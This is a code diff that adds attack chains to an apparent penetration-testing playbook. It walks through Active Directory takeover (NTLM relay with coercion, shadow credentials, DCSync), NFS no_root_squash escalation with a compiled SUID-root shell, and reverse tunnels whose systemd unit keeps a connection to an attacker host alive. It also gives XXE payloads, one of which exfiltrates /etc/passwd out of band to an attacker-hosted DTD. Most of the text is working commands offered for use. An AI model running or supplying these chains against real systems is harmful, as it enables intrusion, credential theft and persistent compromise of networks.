+          "inline_command": "nxc ldap <dc-ip> -u '' -p '' -M ldap-checker",
+          "inputs": {
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "Output:\n  LDAP signing NOT enforced — green light, signing relay viable.\n  LDAP signing enforced — must use LDAPS (TLS) channel binding bypass.\n"
+        },
+        {
+          "id": "start_listener",
+          "name": "Start ntlmrelayx with shadow-credentials",
+          "command_ref": "ntlmrelayx-ldaps",
+          "inputs": {
+            "ip": "${dc_ip}"
+          },
+          "notes": "Use the LDAPS variant (channel binding not enforced by default at\nServer <= 2016). The `--shadow-credentials` flag tells the script\nto write msDS-KeyCredentialLink on relay success.\nFull command:\n  impacket-ntlmrelayx -t ldaps://<dc> --shadow-credentials \\\n    --shadow-target '<target_principal>'\n"
+        },
+        {
+          "id": "coerce",
+          "name": "Coerce a victim to authenticate to your relay",
+          "command_ref": "coercer",
+          "inputs": {
+            "listener_ip": "${listener_ip}",
+            "target_ip": "${dc_ip}"
+          },
+          "notes": "Pick a high-priv victim:\n  - DC itself (DC$ → has GenericAll on most objects).\n  - A server you don't have access to (its machine account writes to itself).\nCoercer tries PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce — one\nusually lands.\n"
+        },
+        {
+          "id": "capture_pfx",
+          "name": "Capture the PFX from ntlmrelayx output",
+          "inline_command": "# Look in the ntlmrelayx terminal for:\n# [+] Saved PFX (#PKCS12) certificate to <target>.pfx",
+          "capture": [
+            {
+              "var": "relayed_pfx",
+              "regex": "Saved PFX [^\n]*to (\\S+\\.pfx)",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "pkinit_auth",
+          "name": "Authenticate as the target via PKINIT",
+          "command_ref": "certipy-auth",
+          "requires": [
+            "relayed_pfx"
+          ],
+          "inputs": {
+            "pfx_file": "${relayed_pfx}",
+            "ip": "${dc_ip}"
+          },
+          "capture": [
+            {
+              "var": "target_nt_hash",
+              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "domain_takeover",
+          "name": "Use the NT hash → DCSync if target was DC",
+          "inline_command": "impacket-secretsdump -hashes ':<hash>' '<domain>/<target>@<dc-ip>' -just-dc",
+          "inputs": {
+            "hash": "${target_nt_hash}",
+            "dc-ip": "${dc_ip}"
+          },
+          "notes": "DC machine accounts (DC01$) hold DCSync rights — using the NT hash\nwith secretsdump's -just-dc dumps every credential in the domain.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "Shadow Credentials via NTLM relay",
+          "url": "https://www.thehacker.recipes/ad/movement/credentials/shadow-credentials"
+        },
+        {
+          "title": "PetitPotam",
+          "url": "https://github.com/topotam/PetitPotam"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "krbtgt hash captured",
+          "reason": "krbtgt → Golden Ticket persistence."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "NTLM hashes captured",
+          "reason": "Spread the new identities."
+        }
       ]
     },
     {
@@ -1078,6 +2003,18 @@ const CHAIN_DATA = {
         {
           "title": "PHP wrappers",
           "url": "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "reverse shell received",
+          "reason": "Stabilize before doing anything else."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "shell on Linux web server",
+          "reason": "www-data → escalate to root."
         }
       ]
     },
@@ -1161,6 +2098,23 @@ const CHAIN_DATA = {
         {
           "title": "HackTricks — Linux PE",
           "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "sudo-gtfobins-escalation",
+          "when": "sudo_allowed populated",
+          "reason": "sudo -l returned anything → GTFOBins lookup."
+        },
+        {
+          "chain": "suid-binary-escalation",
+          "when": "suid_binaries populated",
+          "reason": "SUID binaries → check each against GTFOBins."
+        },
+        {
+          "chain": "docker-breakout",
+          "when": "user is in docker or lxd group",
+          "reason": "Group membership = root."
         }
       ]
     },
@@ -1257,6 +2211,104 @@ const CHAIN_DATA = {
           "title": "NetExec — MSSQL",
           "url": "https://www.netexec.wiki/mssql-protocol"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "windows-priv-esc-recon",
+          "when": "shell returned",
+          "reason": "On the box — sweep for privesc."
+        },
+        {
+          "chain": "seimpersonate-potato",
+          "when": "SeImpersonatePrivilege enabled",
+          "reason": "SQL service accounts usually have it — instant SYSTEM."
+        }
+      ]
+    },
+    {
+      "id": "nfs-no-root-squash",
+      "name": "Linux PE — NFS no_root_squash → SUID drop → root",
+      "description": "An exported NFS share with `no_root_squash` (or `no_all_squash`) lets a root-mounted client write files owned by uid 0 on the remote filesystem. Drop a SUID binary, run it on the target, root.\n",
+      "tags": [
+        "linux",
+        "priv-esc",
+        "nfs",
+        "classic-linux"
+      ],
+      "difficulty": "easy",
+      "inputs": [
+        {
+          "name": "target_ip",
+          "description": "NFS server IP.",
+          "source": "target_context.ip",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "enum_shares",
+          "name": "Enumerate exports",
+          "inline_command": "showmount -e <ip>",
+          "inputs": {
+            "ip": "${target_ip}"
+          },
+          "notes": "Look for `/something *` (no host restriction) and `(no_root_squash)`\nin /etc/exports on the server. The first means you can mount it from\nanywhere; the second is the privesc primitive.\n"
+        },
+        {
+          "id": "confirm_no_root_squash",
+          "command_ref": "nxc-nfs-shares",
+          "inputs": {
+            "ip": "${target_ip}"
+          },
+          "name": "Confirm no_root_squash via NetExec NFS module"
+        },
+        {
+          "id": "mount_share",
+          "name": "Mount the export locally as root",
+          "inline_command": "mkdir -p /mnt/nfs\nsudo mount -t nfs <ip>:/path/to/share /mnt/nfs -o nolock\nls -la /mnt/nfs\n",
+          "inputs": {
+            "ip": "${target_ip}"
+          },
+          "notes": "`-o nolock` avoids the rpc.statd dance. Files inside the share now\nshow their actual owner uids — sometimes you can already read\npasswords / SSH keys without the SUID trick.\n"
+        },
+        {
+          "id": "drop_suid",
+          "name": "Compile a tiny SUID-root shell and drop it",
+          "inline_command": "cat > /tmp/x.c <<'EOF'\n#include <stdio.h>\n#include <unistd.h>\nint main() { setreuid(0, 0); execve(\"/bin/sh\", NULL, NULL); return 0; }\nEOF\ngcc /tmp/x.c -o /mnt/nfs/.sh\nsudo chown root:root /mnt/nfs/.sh\nsudo chmod 4755 /mnt/nfs/.sh\n"
+        },
+        {
+          "id": "trigger_on_target",
+          "name": "Run the SUID binary on the target (any low-priv shell)",
+          "inline_command": "/path/to/share/.sh -p  # -p preserves the effective UID",
+          "notes": "Get a low-priv shell on the target first (SSH key from the share,\nweb RCE, anything). Then run the SUID binary you just dropped → root.\n"
+        },
+        {
+          "id": "confirm",
+          "name": "Confirm root",
+          "inline_command": "id"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — NFS",
+          "url": "https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html"
+        },
+        {
+          "title": "no_root_squash explained",
+          "url": "https://man7.org/linux/man-pages/man5/exports.5.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "rooted shell is messy",
+          "reason": "Upgrade the new root shell."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "pivoting to other hosts",
+          "reason": "Now root — pull every secret, including SSH keys for lateral."
+        }
       ]
     },
     {
@@ -1325,6 +2377,27 @@ const CHAIN_DATA = {
         {
           "title": "HackTricks — Pentesting Methodology",
           "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "smb-null-session-enum",
+          "when": "open_ports includes 445 or 139",
+          "reason": "SMB open → null-session enum first."
+        },
+        {
+          "chain": "ldap-anonymous-enum",
+          "when": "open_ports includes 389 or 636",
+          "reason": "LDAP/AD detected — walk the directory."
+        },
+        {
+          "chain": "mssql-impersonation-chain",
+          "when": "open_ports includes 1433",
+          "reason": "MSSQL is open and almost always exploitable."
+        },
+        {
+          "chain": "shell-stabilization",
+          "reason": "Keep in reach — needed the moment any service yields a shell."
         }
       ]
     },
@@ -1417,6 +2490,18 @@ const CHAIN_DATA = {
         {
           "title": "Charlie Clark's noPac writeup",
           "url": "https://exploit.ph/exploiting-cve-2021-42278-and-cve-2021-42287.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "krbtgt_nt_hash captured",
+          "reason": "krbtgt → Golden Ticket."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_nt_hash captured",
+          "reason": "Spread with the DA hash."
         }
       ]
     },
@@ -1531,6 +2616,18 @@ const CHAIN_DATA = {
           "title": "Certipy",
           "url": "https://github.com/ly4k/Certipy"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "dc_nt_hash captured",
+          "reason": "DA hash → Golden Ticket."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_nt_hash captured",
+          "reason": "Spread the DA hash."
+        }
       ]
     },
     {
@@ -1612,6 +2709,123 @@ const CHAIN_DATA = {
         {
           "title": "NetExec — bruteforce",
           "url": "https://www.netexec.wiki/getting-started/bruteforce"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ldap-anonymous-enum",
+          "when": "spray_hits captured",
+          "reason": "Re-run LDAP enum AUTHENTICATED — you see more."
+        },
+        {
+          "chain": "gpp-cpassword-recovery",
+          "when": "spray_hits captured",
+          "reason": "Now authenticate and grep SYSVOL."
+        },
+        {
+          "chain": "esc1-adcs-takeover",
+          "when": "spray_hits + AD CS reachable",
+          "reason": "Hunt for ESC1 templates with the new identity."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "spray_hits give a Pwn3d!",
+          "reason": "Spread further if the new creds are local admin."
+        }
+      ]
+    },
+    {
+      "id": "pivoting-chisel-ligolo",
+      "name": "Pivoting — reverse tunnel through compromised host (chisel / ligolo-ng)",
+      "description": "You popped a perimeter host and now need to reach an internal subnet that's not routable from your attacker box. Spin a reverse SOCKS or layer-2 tunnel through the foothold and stop fighting the firewall.\n",
+      "tags": [
+        "pivoting",
+        "tunneling",
+        "post-exploitation",
+        "networking"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "foothold_ip",
+          "description": "IP you compromised (the host that has access to the internal subnet).",
+          "required": true
+        },
+        {
+          "name": "internal_cidr",
+          "description": "Subnet you want to reach from your attacker box (e.g. 10.0.0.0/24).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "pick_method",
+          "name": "Pick the tunneling method",
+          "inline_command": "echo '— chisel: SOCKS5 proxy, easy, works for any TCP\n— ligolo-ng: full L3 tunnel (use any tool natively, no proxychains)\n— sshuttle: poor-man\\'s VPN if SSH access\n— socat: single-port forward when that\\'s all you need'",
+          "notes": "chisel is the safest default. ligolo-ng is more powerful (real L3\ntunnel) but needs root on the attacker side to create the TUN.\nsshuttle if you have SSH on the foothold — zero install on victim.\n"
+        },
+        {
+          "id": "chisel_setup",
+          "name": "chisel (SOCKS5 reverse tunnel)",
+          "inline_command": "# Attacker:\n./chisel server --reverse --port 8000\n# Victim:\n./chisel client <attacker_ip>:8000 R:1080:socks\n# Attacker — verify and use:\ncurl --socks5 127.0.0.1:1080 http://<internal_ip>/\n# Then proxychains-ng:\nsed -i 's/socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains.conf\nproxychains4 nxc smb <internal_cidr> -u <user> -p <password>\n",
+          "inputs": {
+            "attacker_ip": "${attacker_ip}",
+            "internal_cidr": "${internal_cidr}"
+          }
+        },
+        {
+          "id": "ligolo_setup",
+          "name": "ligolo-ng (full L3 tunnel — no proxychains)",
+          "inline_command": "# Attacker (one-time):\nsudo ip tuntap add user $USER mode tun ligolo\nsudo ip link set ligolo up\nsudo ip route add <internal_cidr> dev ligolo\n./proxy -selfcert -laddr 0.0.0.0:11601\n# Victim:\n./agent -connect <attacker_ip>:11601 -ignore-cert\n# Attacker — at the ligolo prompt:\nsession\nstart\n# Now use any tool natively:\nnmap -sV -p 445,3389 <internal_cidr>\nevil-winrm -i <internal_ip> ...\n",
+          "inputs": {
+            "attacker_ip": "${attacker_ip}",
+            "internal_cidr": "${internal_cidr}"
+          }
+        },
+        {
+          "id": "sshuttle_setup",
+          "name": "sshuttle (poor-man's VPN over SSH)",
+          "inline_command": "sshuttle -r <user>@<foothold_ip> <internal_cidr>\n# Now any TCP/UDP to that subnet routes through the SSH tunnel.\n",
+          "inputs": {
+            "foothold_ip": "${foothold_ip}",
+            "internal_cidr": "${internal_cidr}"
+          }
+        },
+        {
+          "id": "validate_pivot",
+          "name": "Verify reachability",
+          "inline_command": "# Pick a likely internal target and probe it:\nproxychains4 nmap -sT -Pn -n -p 22,80,443,445,3389 <internal_ip>\n# Or directly (if using ligolo / sshuttle):\nnmap -sT -Pn -n -p 22,80,443,445,3389 <internal_ip>\n"
+        },
+        {
+          "id": "persistence_for_pivot",
+          "name": "Keep the tunnel alive — systemd / scheduled task",
+          "inline_command": "# On the victim (long-running engagement), wrap the client in a\n# systemd unit / scheduled task so it survives reboots.\n# Example (Linux):\nsudo tee /etc/systemd/system/chisel-client.service <<'EOF'\n[Unit]\nDescription=chisel client\nAfter=network-online.target\n[Service]\nExecStart=/opt/chisel client <attacker_ip>:8000 R:1080:socks\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsudo systemctl enable --now chisel-client\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "chisel",
+          "url": "https://github.com/jpillora/chisel"
+        },
+        {
+          "title": "ligolo-ng",
+          "url": "https://github.com/nicocha30/ligolo-ng"
+        },
+        {
+          "title": "sshuttle",
+          "url": "https://github.com/sshuttle/sshuttle"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "nmap-recon",
+          "when": "tunnel up",
+          "reason": "Repeat recon — but now against the internal subnet."
+        },
+        {
+          "chain": "smb-null-session-enum",
+          "when": "SMB open on an internal host",
+          "reason": "Restart the AD attack tree against the internal network."
         }
       ]
     },
@@ -1729,6 +2943,23 @@ const CHAIN_DATA = {
         {
           "title": "NetExec — SMB",
           "url": "https://www.netexec.wiki/smb-protocol"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "dpapi-secrets-extraction",
+          "when": "Pwn3d! host found",
+          "reason": "Loot DPAPI on every Pwn3d! host."
+        },
+        {
+          "chain": "mssql-impersonation-chain",
+          "when": "SQL service reachable",
+          "reason": "Pivot to MSSQL with captured creds."
+        },
+        {
+          "chain": "windows-priv-esc-recon",
+          "when": "low-priv shell",
+          "reason": "If you landed but aren't SYSTEM yet."
         }
       ]
     },
@@ -1850,6 +3081,18 @@ const CHAIN_DATA = {
           "title": "HackTricks — RBCD",
           "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "dpapi-secrets-extraction",
+          "when": "forged admin ticket",
+          "reason": "Loot the target with the fresh admin ticket."
+        },
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "target was DC",
+          "reason": "Take a Golden Ticket out before cleanup."
+        }
       ]
     },
     {
@@ -1910,6 +3153,17 @@ const CHAIN_DATA = {
         {
           "title": "GodPotato",
           "url": "https://github.com/BeichenDream/GodPotato"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "dpapi-secrets-extraction",
+          "reason": "SYSTEM → secretsdump locally, pull every user's DPAPI."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "NTLM hashes captured locally",
+          "reason": "New identities → lateral movement."
         }
       ]
     },
@@ -2020,6 +3274,23 @@ const CHAIN_DATA = {
           "title": "Certipy shadow command",
           "url": "https://github.com/ly4k/Certipy#shadow"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "pth-lateral-spread",
+          "when": "target_nt_hash captured",
+          "reason": "New identity → spread laterally."
+        },
+        {
+          "chain": "dpapi-secrets-extraction",
+          "when": "target was local admin",
+          "reason": "Loot DPAPI as the new identity."
+        },
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "target was DA / DC",
+          "reason": "Persistence before cleanup."
+        }
       ]
     },
     {
@@ -2084,6 +3355,18 @@ const CHAIN_DATA = {
         {
           "title": "HackTricks — Shells (Linux)",
           "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/linux.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "shell is on Linux",
+          "reason": "You're stable — start enumeration."
+        },
+        {
+          "chain": "windows-priv-esc-recon",
+          "when": "shell is on Windows",
+          "reason": "You're stable — start enumeration."
         }
       ]
     },
@@ -2166,6 +3449,22 @@ const CHAIN_DATA = {
         {
           "title": "NetExec SMB module",
           "url": "https://www.netexec.wiki/smb-protocol"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "password-spray",
+          "when": "user_list captured",
+          "reason": "You have users — spray a small candidate set."
+        },
+        {
+          "chain": "ldap-anonymous-enum",
+          "reason": "Pair SMB enum with LDAP enum for the full AD picture."
+        },
+        {
+          "chain": "gpp-cpassword-recovery",
+          "when": "any valid credential",
+          "reason": "Authenticated SMB → grep SYSVOL for GPP."
         }
       ]
     },
@@ -2265,6 +3564,23 @@ const CHAIN_DATA = {
           "title": "sqlmap usage",
           "url": "https://github.com/sqlmapproject/sqlmap/wiki/Usage"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "reverse shell received",
+          "reason": "Stabilize."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "shell on Linux DB host",
+          "reason": "DB user is usually low-priv."
+        },
+        {
+          "chain": "windows-priv-esc-recon",
+          "when": "shell on Windows MSSQL host",
+          "reason": "NT SERVICE\\MSSQLSERVER often has SeImpersonate."
+        }
       ]
     },
     {
@@ -2346,6 +3662,17 @@ const CHAIN_DATA = {
           "title": "HackTricks — SSTI",
           "url": "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "reason": "Stabilize the resulting shell."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "shell on Linux",
+          "reason": "Escalate."
+        }
       ]
     },
     {
@@ -2404,6 +3731,13 @@ const CHAIN_DATA = {
         {
           "title": "Sudo env_keep abuse",
           "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "rooted shell is messy",
+          "reason": "Upgrade the new root shell to a real TTY."
         }
       ]
     },
@@ -2464,6 +3798,13 @@ const CHAIN_DATA = {
         {
           "title": "HackTricks — SUID escalation",
           "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#suid"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "rooted shell is messy",
+          "reason": "Upgrade the new root shell."
         }
       ]
     },
@@ -2547,6 +3888,18 @@ const CHAIN_DATA = {
           "title": "PetitPotam",
           "url": "https://github.com/topotam/PetitPotam"
         }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "krbtgt via DCSync",
+          "reason": "You DCSyncd — Golden Ticket time."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "ntlm_hashes captured",
+          "reason": "You have everyone's hash — spread."
+        }
       ]
     },
     {
@@ -2604,6 +3957,12 @@ const CHAIN_DATA = {
         {
           "title": "HackTricks — Unquoted Service Path",
           "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#unquoted-service-paths"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "dpapi-secrets-extraction",
+          "reason": "SYSTEM shell — loot the box."
         }
       ]
     },
@@ -2676,6 +4035,107 @@ const CHAIN_DATA = {
         {
           "title": "PEASS-ng",
           "url": "https://github.com/peass-ng/PEASS-ng"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "seimpersonate-potato",
+          "when": "privs include SeImpersonate",
+          "reason": "The classic Potato escalation."
+        },
+        {
+          "chain": "unquoted-service-path",
+          "when": "unquoted service found",
+          "reason": "Drop a payload at the truncated prefix."
+        },
+        {
+          "chain": "alwaysinstallelevated",
+          "when": "AlwaysInstallElevated registry = 1",
+          "reason": "MSI elevation freebie."
+        }
+      ]
+    },
+    {
+      "id": "xxe-to-file-read",
+      "name": "Web — XXE → file read → escalate to SSRF/RCE",
+      "description": "XML External Entity injection: feed the parser an external DTD or entity, exfiltrate files / hit internal endpoints. Java parsers are especially generous with file:// and http:// URI schemes.\n",
+      "tags": [
+        "web",
+        "xxe",
+        "xml",
+        "file-disclosure",
+        "ssrf"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "target_url",
+          "description": "Endpoint that parses XML you control.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "baseline",
+          "name": "Confirm XML is parsed (echo content)",
+          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/xml' \\\n  -d '<?xml version=\"1.0\"?><foo>HELLOWORLD</foo>'\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "If `HELLOWORLD` appears anywhere in the response → reflected XML\ncontent; XXE viable. If response is fully ignored, try blind XXE\nvia an out-of-band channel (interactsh/Burp Collaborator).\n"
+        },
+        {
+          "id": "file_read",
+          "name": "Read /etc/passwd via external entity",
+          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/xml' \\\n  -d '<?xml version=\"1.0\"?>\n      <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n      <foo>&xxe;</foo>'\n",
+          "inputs": {
+            "url": "${target_url}"
+          }
+        },
+        {
+          "id": "read_app_source",
+          "name": "Read app source (PHP via base64 wrapper)",
+          "inline_command": "curl -X POST '<url>' \\\n  -H 'Content-Type: application/xml' \\\n  -d '<?xml version=\"1.0\"?>\n      <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]>\n      <foo>&xxe;</foo>'\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "base64-decode the result to read PHP source — find db creds, more\nendpoints, secret keys. Same trick works for Java with the `jar://`\nscheme to read JAR contents.\n"
+        },
+        {
+          "id": "blind_xxe_oob",
+          "name": "Blind XXE — out-of-band exfil via external DTD",
+          "inline_command": "# 1) Host this DTD on your attacker box (python3 -m http.server 80):\ncat > evil.dtd <<'EOF'\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://<lhost>/?d=%file;'>\">\n%eval;\n%exfil;\nEOF\n# 2) Inject the loader:\ncurl -X POST '<url>' \\\n  -H 'Content-Type: application/xml' \\\n  -d '<?xml version=\"1.0\"?>\n      <!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://<lhost>/evil.dtd\"> %dtd;]>\n      <foo>x</foo>'\n",
+          "inputs": {
+            "url": "${target_url}",
+            "lhost": "${attacker_ip}"
+          },
+          "notes": "Works when the parser blocks direct echo but still resolves remote\nDTDs. Your web log will show `GET /?d=<base64-passwd>`. Some parsers\nreject `%file;` interpolation in URL params — use FTP exfil instead\n(run a small ftpserver.py to grab data via FTP URLs).\n"
+        },
+        {
+          "id": "ssrf_pivot",
+          "name": "Use XXE as SSRF → hit internal services",
+          "inline_command": "curl -X POST '<url>' \\\n  -d '<?xml version=\"1.0\"?>\n      <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal-admin.local/users\">]>\n      <foo>&xxe;</foo>'\n",
+          "inputs": {
+            "url": "${target_url}"
+          },
+          "notes": "Same XXE primitive lets you proxy HTTP requests inside the network.\nCommon targets: IMDS (169.254.169.254), Kubernetes API (10.0.0.1),\ninternal admin panels. Pair with aws-imds-ssrf if EC2-hosted.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — XXE",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
+        },
+        {
+          "title": "PayloadsAllTheThings — XXE",
+          "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "aws-imds-ssrf",
+          "when": "XXE works as SSRF and target is on EC2",
+          "reason": "Pivot through XXE to harvest cloud creds."
         }
       ]
     },
@@ -2772,6 +4232,18 @@ const CHAIN_DATA = {
         {
           "title": "dirkjanm/CVE-2020-1472",
           "url": "https://github.com/dirkjanm/CVE-2020-1472"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "krbtgt_nt_hash captured",
+          "reason": "krbtgt in hand → Golden Ticket persistence."
+        },
+        {
+          "chain": "pth-lateral-spread",
+          "when": "dc_nt_hash captured",
+          "reason": "DA hash → walk every server."
         }
       ]
     }
